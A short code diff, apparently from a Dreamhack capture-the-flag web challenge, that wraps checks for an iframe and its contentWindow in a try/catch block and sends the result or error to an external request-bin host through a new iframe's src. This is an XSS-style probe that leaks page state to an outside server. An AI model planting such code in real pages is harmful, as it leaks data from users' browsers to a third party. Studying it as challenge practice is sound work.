@@ -5,11 +5,16 @@
             const afterLoad = function() {
                   const iframe = document.createElement("iframe")
                   let text = "";
+                try {
                     if (document.getElementsByTagName("iframe")[0]) {
                         text = "iframe"
                     }
                     if (document.getElementsByTagName("iframe")[0].contentWindow) {
                         text = "contentWindow"
+                    }
+                    }
+                    catch (error) {
+                        text = error
                     }
                 
                   iframe.src = "https://gjiuwez.request.dreamhack.games/" + text
